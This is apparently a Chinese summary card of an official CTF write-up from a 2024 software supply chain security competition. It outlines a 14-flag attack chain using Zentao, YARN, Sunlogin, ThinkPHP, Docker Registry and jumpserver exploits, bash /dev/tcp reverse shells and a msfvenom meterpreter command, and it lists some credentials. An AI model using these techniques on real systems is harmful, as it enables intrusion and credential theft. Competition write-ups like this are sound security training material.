---
title: "2024 软件供应链安全技能竞赛官方 WriteUp（4 网段 14 flag 综合渗透）"
category: web
tags: ["2024 软件供应链安全技能竞赛", "web", "禅道 Zentao RCE v18.0.beta1", "YARN REST API new-application", "向日葵 RCE CVE-2022-10270", "ThinkPHP5 invokefunction"]
signals: ["2024 软件供应链安全技能竞赛 2024", "禅道 Zentao RCE v18.0.beta1", "YARN REST API new-application", "向日葵 RCE CVE-2022-10270", "ThinkPHP5 invokefunction", "jumpserver Celery 模板注入", "Docker Registry 5000/_catalog", "Socks5 代理", "frida Java.choose", "rce", "ssti", "lfi", "auth_bypass", "flag"]
difficulty: hard
source: "https://www.ctfiot.com/207510.html"
tools: ["Frida", "Java", "ThinkPHP", "curl", "x86/x64"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 2024 软件供应链安全技能竞赛官方 WriteUp（4 网段 14 flag 综合渗透）

> 赛事：2024 软件供应链安全技能竞赛 2024 | 方向：web | 难度：hard | 工具：Frida、Java、ThinkPHP、curl、x86/x64

## 一句话总结

14 flag 全网段综合：禅道/YARN/向日葵/ThinkPHP/Docker Registry/jumpserver 模板/ThinkPHP 链——把企业软件开发-测试-生产-运营商四段打通到底。

## 攻击链

1. flag1: 禅道 Zentao v18.0.beta1 captcha RCE + curl /tmp/a + chmod + /bin/bash
2. flag2: cat /www/zentaopms/config/my.php 拿 admin@mail.yym1ng.com/1qazcde3!@#
3. flag3: YARN ws/v1/cluster/apps am-container-spec command bash -i /dev/tcp
4. flag4: ftp wsfxsdfrsaqwczdsa (windows 192.168.10.55)
5. flag5: 向日葵 sunlogin_rce + reg fDenyTSConnections=0 + Guest 启用+Admin@123
6. flag6: yujianxg MZCiP6gfusWj3
7. flag7: Java.perform frida Java.choose java.lang.String 凭据 dump
8. flag8: admin/123456 默认口令
9. flag9: thinkphp s=/api/thinkapp/invokefunction call_user_func_array file_put_contents a.php
10. flag10: ThinkPHP call_user_func_array passthru bash base64
11. flag11: Docker registry /v2/_catalog + insecure-registries + auth=base64
12. flag12: admin gygsud7gbskdbbxd3rtqak
13. flag13: jumpserver /manage/script 模板注入 bash base64 ansible delegate_to=localhost
14. flag14: jumpserver 模板编辑命令执行

## 关键 payload

```
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_host LPORT=local_port -f elf > a
```

## 经验教训

软件供应链靶场核心是「开源自带漏洞 + 默认口令 + 内网横向」：禅道/向日葵/jumpserver 几乎年年有未授权 RCE；YARN REST API 默认 8088 暴露就送 shell；Docker Registry 5000 端口 + auth=base64(user:pass) 是无认证的私有镜像金库。

## 标签

禅道 Zentao RCE v18.0.beta1、YARN REST API new-application、向日葵 RCE CVE-2022-10270、ThinkPHP5 invokefunction、jumpserver Celery 模板注入、Docker Registry 5000/_catalog、Socks5 代理、frida Java.choose、docker pull 私有镜像、Bash /dev/tcp 反弹、ansible delegate_to localhost、Apache Druid 命令执行

## 参考来源

- https://www.ctfiot.com/207510.html
- 原文件：2024年软件供应链安全技能竞赛官方WriteUp.full.md
